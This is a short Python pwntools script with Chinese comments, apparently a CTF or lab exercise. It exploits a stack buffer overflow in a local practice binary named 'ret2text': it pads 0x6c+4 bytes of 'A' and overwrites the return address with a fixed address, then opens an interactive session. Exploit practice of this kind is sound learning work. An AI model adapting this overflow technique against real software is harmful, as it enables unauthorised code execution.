

##coding=utf8
from pwn import *
## 构造与程序交互的对象

def main():

    sh = process('./ret2text')
    target = 0x0804863A
    print (p32(target))

    ## 构造payload
    payload = 'A' * (0x6c+4) + p32(target).decode('unicode_escape')
    print (payload)

    ## 向程序发送字符串
    sh.sendline(payload)


    sh.interactive()

if __name__ == "__main__":
    main()

